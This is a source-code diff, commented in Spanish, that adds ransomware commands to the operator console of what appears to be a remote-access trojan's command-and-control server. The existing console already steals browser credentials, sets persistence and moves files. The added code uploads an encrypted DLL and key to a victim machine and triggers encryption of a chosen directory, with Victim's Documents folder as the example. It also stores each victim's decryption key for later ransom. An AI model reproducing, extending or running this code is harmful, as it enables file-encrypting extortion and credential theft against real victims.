@@ -250,6 +250,11 @@ async fn handle_client(
                                 let encoded = response.strip_prefix("__CREDENTIALS_B64__:").unwrap_or("");
                                 info!("[{}] Recibiendo credenciales robadas (Base64)", id);
                                 handle_credentials_harvest(encoded, id);
+                            } else if response.starts_with("__RANSOMWARE__:") {
+                                // Respuesta de /encrypt o /decrypt
+                                let result = response.strip_prefix("__RANSOMWARE__:").unwrap_or("");
+                                info!("[{}] Respuesta ransomware: {}", id, result);
+                                handle_ransomware_response(result, id);
                             } else if response.starts_with("__ERROR__:") {
                                 let error = response.strip_prefix("__ERROR__:").unwrap_or(&response);
                                 error!("[{}] Error recibido: {}", id, error);
@@ -436,6 +441,51 @@ fn handle_credentials_harvest(encoded_data: &str, client_id: ClientId) {
     }
 }
 
+fn handle_ransomware_response(result: &str, client_id: ClientId) {
+    println!();
+    println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_yellow());
+    println!("{}", format!("║           🔐 RANSOMWARE RESULT [{}]", client_id).bright_yellow().bold());
+    println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_yellow());
+    println!();
+    
+    // Parsear resultado
+    if result.starts_with("KEY:") {
+        // Resultado de encriptación
+        let parts: Vec<&str> = result.split(':').collect();
+        if parts.len() >= 4 {
+            let key = parts[1];
+            let encrypted_count = parts[3];
+            
+            println!("  {} {}", "✅ Encriptación completada".bright_green().bold(), "".bright_white());
+            println!("  {} {}", "📁 Archivos encriptados:".bright_cyan().bold(), encrypted_count.bright_white());
+            println!();
+            println!("{}", "─".repeat(60).bright_black());
+            println!("  {} {}", "🔑 CLAVE DE DESENCRIPTACIÓN:".bright_red().bold(), "".bright_white());
+            println!("  {}", key.bright_yellow());
+            println!("{}", "─".repeat(60).bright_black());
+            println!();
+            println!("{}", "  ⚠️  GUARDA ESTA CLAVE - Es la única forma de recuperar los archivos".bright_red().bold());
+            println!();
+            
+            // Guardar clave en archivo
+            let timestamp = chrono::Local::now().format("%Y%m%d_%H%M%S");
+            let filename = format!("harvested/ransomware_key_{}_{}.txt", client_id, timestamp);
+            if let Ok(_) = fs::write(&filename, format!("Client: {}\nTimestamp: {}\nKey: {}\n", client_id, timestamp, key)) {
+                println!("  {} {}", "💾 Clave guardada en:".bright_cyan().bold(), filename.bright_white());
+            }
+        }
+    } else if result.starts_with("OK:") {
+        // Resultado de desencriptación
+        let msg = result.strip_prefix("OK:").unwrap_or(result);
+        println!("  {} {}", "✅".bright_green(), msg.bright_white());
+    } else {
+        // Otro resultado
+        println!("  {}", result.bright_white());
+    }
+    
+    println!();
+}
+
 fn base64_decode(data: &str) -> Result<Vec<u8>, String> {
     let data = data.trim();
     let mut result = Vec::new();
@@ -619,6 +669,8 @@ async fn main() {
                     println!("  {} {:<20} {}", "📥".bright_cyan(), "/download <ruta>", "Descarga archivo desde el cliente".bright_white());
                     println!("  {} {:<20} {}", "📤".bright_green(), "/upload <local> <remoto>", "Sube archivo al cliente".bright_white());
                     println!("  {} {:<20} {}", "🔑".bright_red(), "/harvest", "Roba credenciales de browsers (Chrome, Edge, Firefox, etc.)".bright_white());
+                    println!("  {} {:<20} {}", "🔒".bright_red(), "/encrypt <ruta> [depth]", "Encripta archivos en directorio (default depth=5)".bright_white());
+                    println!("  {} {:<20} {}", "🔓".bright_green(), "/decrypt <ruta> <key> [depth]", "Desencripta archivos con clave".bright_white());
                     println!("  {} {:<20} {}", "📌".bright_magenta(), "/persist <method>", "Establece persistencia (registry|task|wmi|startup)".bright_white());
                     println!("  {} {:<20} {}", "🧹".bright_yellow(), "/persist_remove", "Remueve persistencia del cliente".bright_white());
                     println!("  {} {:<20} {}", "📡".bright_blue(), "/beacon <int:jit>", "Configura intervalo beacon (ej: 60:30 = 60s ±30%)".bright_white());
@@ -909,6 +961,203 @@ async fn main() {
                             // Enviar comando de harvest
                             if let Err(e) = client.tx.send("__HARVEST__".to_string()) {
                                 error!("[{}] Error enviando comando __HARVEST__: {}", id, e);
+                                println!("{} {}", "❌ Error:".bright_red().bold(), e);
+                            }
+                        } else {
+                            println!("{} Cliente {} desconectado", "❌".bright_red(), id);
+                            *selected_client.lock().unwrap() = None;
+                        }
+                    } else {
+                        println!("{}", "❌ No hay cliente seleccionado. Usa /select <id>".bright_red());
+                    }
+                }
+                "/encrypt" => {
+                    if parts.len() < 2 {
+                        println!("{} /encrypt <ruta> [max_depth]", "❌ Uso:".bright_red());
+                        println!("   Ejemplo: /encrypt C:\\\\Users\\\\Victim\\\\Documents 5");
+                        continue;
+                    }
+                    
+                    let path = parts[1];
+                    let max_depth = if parts.len() > 2 {
+                        parts[2]
+                    } else {
+                        "5"
+                    };
+                    
+                    let selected = *selected_client.lock().unwrap();
+                    
+                    if let Some(id) = selected {
+                        let clients = clients.lock().unwrap();
+                        
+                        if let Some(client) = clients.get(&id) {
+                            info!("[{}] Comando /encrypt: Encriptando archivos en {}", id, path);
+                            
+                            // Verificar que existan los archivos del módulo
+                            let modules_dir = get_modules_path();
+                            let ransomware_enc_path = modules_dir.join("ransomware.enc");
+                            let ransomware_key_path = modules_dir.join("ransomware.key");
+                            
+                            if !ransomware_enc_path.exists() || !ransomware_key_path.exists() {
+                                println!("{}", "❌ Error: Módulo ransomware no encontrado".bright_red());
+                                println!("{}", "   Genera el módulo con: cargo run -p builder -- encrypt-module --module ransomware".bright_yellow());
+                                continue;
+                            }
+                            
+                            // Leer archivos
+                            let dll_data = match fs::read(&ransomware_enc_path) {
+                                Ok(data) => data,
+                                Err(e) => {
+                                    println!("{} Error leyendo ransomware.enc: {}", "❌".bright_red(), e);
+                                    continue;
+                                }
+                            };
+                            
+                            let key_data = match fs::read(&ransomware_key_path) {
+                                Ok(data) => data,
+                                Err(e) => {
+                                    println!("{} Error leyendo ransomware.key: {}", "❌".bright_red(), e);
+                                    continue;
+                                }
+                            };
+                            
+                            println!();
+                            println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_red());
+                            println!("{}", format!("║           🔒 ENCRYPTING FILES [{}]", id).bright_red().bold());
+                            println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_red());
+                            println!();
+                            println!("{}", "  📤 Subiendo ransomware.enc...".bright_yellow());
+                            
+                            // Subir DLL encriptada
+                            let encoded_dll = base64_encode(&dll_data);
+                            let upload_dll_cmd = format!("__UPLOAD__|ransomware.enc|{}", encoded_dll);
+                            if let Err(e) = client.tx.send(upload_dll_cmd) {
+                                error!("[{}] Error enviando ransomware.enc: {}", id, e);
+                                println!("{} {}", "❌ Error:".bright_red().bold(), e);
+                                continue;
+                            }
+                            
+                            std::thread::sleep(std::time::Duration::from_millis(200));
+                            
+                            println!("{}", "  🔑 Subiendo ransomware.key...".bright_yellow());
+                            
+                            // Subir clave
+                            let encoded_key = base64_encode(&key_data);
+                            let upload_key_cmd = format!("__UPLOAD__|ransomware.key|{}", encoded_key);
+                            if let Err(e) = client.tx.send(upload_key_cmd) {
+                                error!("[{}] Error enviando ransomware.key: {}", id, e);
+                                println!("{} {}", "❌ Error:".bright_red().bold(), e);
+                                continue;
+                            }
+                            
+                            std::thread::sleep(std::time::Duration::from_millis(200));
+                            
+                            println!("{}", "  🔒 Ejecutando encriptación...".bright_yellow());
+                            println!();
+                            
+                            // Ejecutar ransomware
+                            let encrypt_cmd = format!("__ENCRYPT__:{}:{}", path, max_depth);
+                            if let Err(e) = client.tx.send(encrypt_cmd) {
+                                error!("[{}] Error enviando comando __ENCRYPT__: {}", id, e);
+                                println!("{} {}", "❌ Error:".bright_red().bold(), e);
+                            }
+                        } else {
+                            println!("{} Cliente {} desconectado", "❌".bright_red(), id);
+                            *selected_client.lock().unwrap() = None;
+                        }
+                    } else {
+                        println!("{}", "❌ No hay cliente seleccionado. Usa /select <id>".bright_red());
+                    }
+                }
+                "/decrypt" => {
+                    if parts.len() < 3 {
+                        println!("{} /decrypt <ruta> <key> [max_depth]", "❌ Uso:".bright_red());
+                        println!("   Ejemplo: /decrypt C:\\\\Users\\\\Victim\\\\Documents abc123... 5");
+                        continue;
+                    }
+                    
+                    let path = parts[1];
+                    let key = parts[2];
+                    let max_depth = if parts.len() > 3 {
+                        parts[3]
+                    } else {
+                        "5"
+                    };
+                    
+                    let selected = *selected_client.lock().unwrap();
+                    
+                    if let Some(id) = selected {
+                        let clients = clients.lock().unwrap();
+                        
+                        if let Some(client) = clients.get(&id) {
+                            info!("[{}] Comando /decrypt: Desencriptando archivos en {}", id, path);
+                            
+                            // Verificar que existan los archivos del módulo
+                            let modules_dir = get_modules_path();
+                            let ransomware_enc_path = modules_dir.join("ransomware.enc");
+                            let ransomware_key_path = modules_dir.join("ransomware.key");
+                            
+                            if !ransomware_enc_path.exists() || !ransomware_key_path.exists() {
+                                println!("{}", "❌ Error: Módulo ransomware no encontrado".bright_red());
+                                println!("{}", "   Genera el módulo con: cargo run -p builder -- encrypt-module --module ransomware".bright_yellow());
+                                continue;
+                            }
+                            
+                            // Leer archivos
+                            let dll_data = match fs::read(&ransomware_enc_path) {
+                                Ok(data) => data,
+                                Err(e) => {
+                                    println!("{} Error leyendo ransomware.enc: {}", "❌".bright_red(), e);
+                                    continue;
+                                }
+                            };
+                            
+                            let key_data = match fs::read(&ransomware_key_path) {
+                                Ok(data) => data,
+                                Err(e) => {
+                                    println!("{} Error leyendo ransomware.key: {}", "❌".bright_red(), e);
+                                    continue;
+                                }
+                            };
+                            
+                            println!();
+                            println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_green());
+                            println!("{}", format!("║           🔓 DECRYPTING FILES [{}]", id).bright_green().bold());
+                            println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_green());
+                            println!();
+                            println!("{}", "  📤 Subiendo ransomware.enc...".bright_yellow());
+                            
+                            // Subir DLL encriptada
+                            let encoded_dll = base64_encode(&dll_data);
+                            let upload_dll_cmd = format!("__UPLOAD__|ransomware.enc|{}", encoded_dll);
+                            if let Err(e) = client.tx.send(upload_dll_cmd) {
+                                error!("[{}] Error enviando ransomware.enc: {}", id, e);
+                                println!("{} {}", "❌ Error:".bright_red().bold(), e);
+                                continue;
+                            }
+                            
+                            std::thread::sleep(std::time::Duration::from_millis(200));
+                            
+                            println!("{}", "  🔑 Subiendo ransomware.key...".bright_yellow());
+                            
+                            // Subir clave
+                            let encoded_key = base64_encode(&key_data);
+                            let upload_key_cmd = format!("__UPLOAD__|ransomware.key|{}", encoded_key);
+                            if let Err(e) = client.tx.send(upload_key_cmd) {
+                                error!("[{}] Error enviando ransomware.key: {}", id, e);
+                                println!("{} {}", "❌ Error:".bright_red().bold(), e);
+                                continue;
+                            }
+                            
+                            std::thread::sleep(std::time::Duration::from_millis(200));
+                            
+                            println!("{}", "  🔓 Ejecutando desencriptación...".bright_yellow());
+                            println!();
+                            
+                            // Ejecutar desencriptación
+                            let decrypt_cmd = format!("__DECRYPT__:{}:{}:{}", path, key, max_depth);
+                            if let Err(e) = client.tx.send(decrypt_cmd) {
+                                error!("[{}] Error enviando comando __DECRYPT__: {}", id, e);
                                 println!("{} {}", "❌ Error:".bright_red().bold(), e);
                             }
                         } else {
